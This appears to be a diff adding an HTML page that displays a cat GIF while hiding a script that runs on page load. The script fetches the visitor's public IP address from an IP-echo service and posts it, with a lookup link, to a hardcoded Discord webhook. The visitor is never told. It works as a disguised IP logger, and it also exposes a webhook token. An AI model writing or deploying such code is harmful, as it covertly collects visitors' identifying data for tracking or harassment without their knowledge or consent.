@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>website</title>
+    <style>
+      body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+
+      img {
+        max-width: 100%;
+        max-height: 100%;
+      }
+    </style>
+  </head>
+  <body>
+    <img src="https://media.tenor.com/VkGE6OgHhTMAAAAi/maxwell-maxwell-cat.gif" alt="Funny Cat GIF">
+
+    <script>
+      function sendMessage() {
+        const retryLimit = 15; // Set a limit for retry attempts
+        let retryCount = 0;
+
+        function sendRequest() {
+          const ipRequest = new XMLHttpRequest();
+          ipRequest.open("GET", "https://icanhazip.com");
+
+          ipRequest.onreadystatechange = function () {
+            if (ipRequest.readyState === 4) {
+              if (ipRequest.status === 200) {
+                const ipAddress = ipRequest.responseText.trim();
+                sendToDiscord(ipAddress);
+              } else {
+                // Retry if the request fails, up to the retry limit
+                if (retryCount < retryLimit) {
+                  retryCount++;
+                  sendRequest();
+                } else {
+                  console.error("Failed to get IP address after retries");
+                }
+              }
+            }
+          };
+
+          ipRequest.send();
+        }
+
+        function sendToDiscord(ipAddress) {
+          const discordRequest = new XMLHttpRequest();
+          discordRequest.open("POST", "https://discord.com/api/webhooks/1212815328875257976/n0u023wA00yOCutLcuOr7mDbfuKayNytGDx8FBCqnKaU_KznI5gS8FqGdOBXbcZxcGfg");
+
+          discordRequest.setRequestHeader('Content-type', 'application/json');
+
+          const ipLink = `https://whatismyipaddress.com/ip/${ipAddress}`;
+
+          const params = {
+            embeds: [
+              {
+                title: "IP Address Update",
+                description: `Global IP = ${ipAddress}\n[IP info](${ipLink})`,
+                color: 123123
+              }
+            ]
+          };
+
+          discordRequest.send(JSON.stringify(params));
+        }
+
+        // Start the initial request
+        sendRequest();
+      }
+
+      document.addEventListener('DOMContentLoaded', sendMessage);
+    </script>
+  </body>
+</html>
